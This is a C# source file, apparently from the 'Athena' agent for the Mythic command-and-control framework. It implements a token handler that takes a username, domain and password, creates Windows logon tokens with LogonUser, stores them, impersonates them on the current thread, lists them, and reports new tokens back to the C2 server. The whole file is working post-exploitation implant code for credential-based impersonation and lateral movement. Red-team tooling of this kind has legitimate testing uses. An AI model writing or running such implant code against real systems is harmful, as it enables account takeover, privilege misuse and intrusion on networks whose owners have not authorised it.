#if DEBUG
#define WINBUILD
#endif

#if WINBUILD
using Athena.Models.Mythic.Tasks;
using Athena.Models.Athena.Commands;
using Athena.Utilities;
using Microsoft.Win32.SafeHandles;
using System;
using System.Collections.Generic;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using PluginBase;
using Newtonsoft.Json;

namespace Athena.Commands
{
    public class TokenHandler
    {
        static Dictionary<string, Token> tokens = new Dictionary<string, Token>();

        public async Task<object> CreateToken(MythicJob job)
        {
            CreateToken tokenOptions = JsonConvert.DeserializeObject<CreateToken>(job.task.parameters);
            SafeAccessTokenHandle hToken = new SafeAccessTokenHandle();
            try
            {
                if (Pinvoke.LogonUser(
                    tokenOptions.username,
                    tokenOptions.domain,
                    tokenOptions.password,
                    tokenOptions.netOnly ? Pinvoke.LogonType.LOGON32_LOGON_NETWORK : Pinvoke.LogonType.LOGON32_LOGON_INTERACTIVE,
                    Pinvoke.LogonProvider.LOGON32_PROVIDER_DEFAULT,
                    out hToken
                    ))
                {
                    Token token = new Token()
                    {
                        Handle = hToken,
                        description  = tokenOptions.username,
                        TokenId = tokens.Count + 1
                    };
                    
                    if (tokenOptions.username.Contains("@"))
                    {
                        string[] split = tokenOptions.username.Split('@');
                        token.user = $"{split[1]}\\{split[0]}";
                    }
                    else
                    {
                        token.user = $"{tokenOptions.domain}\\{tokenOptions.username}";
                    }


                    tokens.Add(tokenOptions.name, token);
                    //tokens.Add(tokenOptions.name, hToken);

                    return new TokenResponseResult()
                    {
                        user_output = $"Token created for {tokenOptions.username}",
                        completed = "true",
                        task_id = job.task.id,
                        //tokens = new List<Token>() { token },
                        callbacktokens = new List<CallbackToken> { new CallbackToken()
                        {
                            action = "add",
                            host = System.Net.Dns.GetHostName(),
                            TokenId = token.TokenId,
                        } }
                        
                    };
                }
                else
                {
                    return new ResponseResult()
                    {
                        user_output = $"Failed to create token: {Marshal.GetLastWin32Error()}",
                        completed = "true",
                        task_id = job.task.id,
                    };
                }

            }
            catch (Exception e)
            {
                return new ResponseResult()
                {
                    user_output = $"Failed to create token: {e.ToString()}",
                    status = "errored",
                    completed = "true",
                    task_id = job.task.id,
                };
            }
        }
        public async Task<bool> ThreadImpersonate(Token t)
        {
            if (tokens.ContainsKey(t.description))
            {
                return Pinvoke.ImpersonateLoggedOnUser(tokens[t.description].Handle);
            }
            return false;
        }
        public async Task<bool> ThreadRevert()
        {
            return Pinvoke.RevertToSelf();
        }
        public async Task<object> ListTokens(MythicJob job)
        {
            StringBuilder sb = new StringBuilder();
            sb.AppendLine("Tokens:");
            sb.AppendLine("------------------------------");
            foreach (var token in tokens)
            {
                sb.AppendFormat($"{token.Key}").AppendLine();
            }

            return new ResponseResult()
            {
                completed = "true",
                status = "success",
                user_output = sb.ToString(),
                task_id = job.task.id,
            };
        }
    }
}
#endif
